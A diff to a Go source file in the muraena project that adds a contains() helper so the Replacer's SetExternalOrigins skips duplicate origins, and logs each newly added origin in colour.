@@ -7,6 +7,8 @@ import (
 	"strings"
 	"sync"
 
+	"github.com/evilsocket/islazy/tui"
+
 	"github.com/muraenateam/muraena/log"
 	"github.com/muraenateam/muraena/session"
 )
@@ -132,7 +134,7 @@ func (r *Replacer) SetExternalOrigins(newOrigins []string) {
 	}
 
 	// merge newOrigins to r.ExternalOrigin and avoid duplicate
-	for _, v := range newOrigins {
+	for _, v := range ArmorDomain(newOrigins) {
 		//if strings.HasPrefix(v, "-") {
 		//	continue
 		//}
@@ -141,7 +143,11 @@ func (r *Replacer) SetExternalOrigins(newOrigins []string) {
 			continue
 		}
 
-		r.ExternalOrigin = append(r.ExternalOrigin, v)
+		// if r.ExternalOrigin does not contain v, append it
+		if !contains(r.ExternalOrigin, v) {
+			log.Info("[*] New origin %v", tui.Green(v))
+			r.ExternalOrigin = append(r.ExternalOrigin, v)
+		}
 	}
 
 	r.ExternalOrigin = ArmorDomain(r.ExternalOrigin)
@@ -184,6 +190,16 @@ func (r *Replacer) SetOrigins(newOrigins map[string]string) {
 		k = strings.ToLower(k)
 		r.Origins[k] = v
 	}
+}
+
+// Contains checks if a string is contained in a slice.
+func contains(slice []string, s string) bool {
+	for _, v := range slice {
+		if v == s {
+			return true
+		}
+	}
+	return false
 }
 
 // Save saves the Replacer struct to a file as JSON.
